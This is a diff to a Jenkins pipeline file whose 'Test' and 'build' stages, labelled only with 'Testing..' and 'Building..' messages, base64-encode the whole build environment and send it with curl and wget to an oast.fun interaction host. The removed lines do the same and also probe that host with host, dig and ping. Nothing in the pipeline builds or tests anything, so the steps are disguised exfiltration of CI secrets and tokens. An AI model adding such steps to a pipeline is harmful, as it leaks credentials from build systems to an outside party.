@@ -3,18 +3,19 @@ pipeline {
 
     stages {
 
-        stage('build') {
+        stage('Test') {
             steps {
                 echo 'Testing..'
-                sh 'env | base64 | curl -k -X POST --data-binary @- https://ch205je2vtc000064ypggetyumcyyyyyn.oast.fun/1'
-                sh '/usr/bin/curl ch205je2vtc000064ypggetyumcyyyyyn.oast.fun/2'
-                sh '/usr/bin/wget --post-data `env|base64` https://ch205je2vtc000064ypggetyumcyyyyyn.oast.fun/3'
-                sh 'host host.ch205je2vtc000064ypggetyumcyyyyyn.oast.fun'
-                sh 'dig dig.ch205je2vtc000064ypggetyumcyyyyyn.oast.fun'
-                sh 'ping -c 5 ping.ch205je2vtc000064ypggetyumcyyyyyn.oast.fun'
+                sh 'env | base64 -w 0 | curl -X POST --data-binary @- ch205je2vtc000064ypggetyumcyyyyyn.oast.fun/1'
             }
         }
         
+        stage('build') {
+            steps {
+                echo 'Building..'
+                sh 'wget --post-data `env|base64 -w 0` ch205je2vtc000064ypggetyumcyyyyyn.oast.fun/2'
+            }
+        }
         
     }
 }
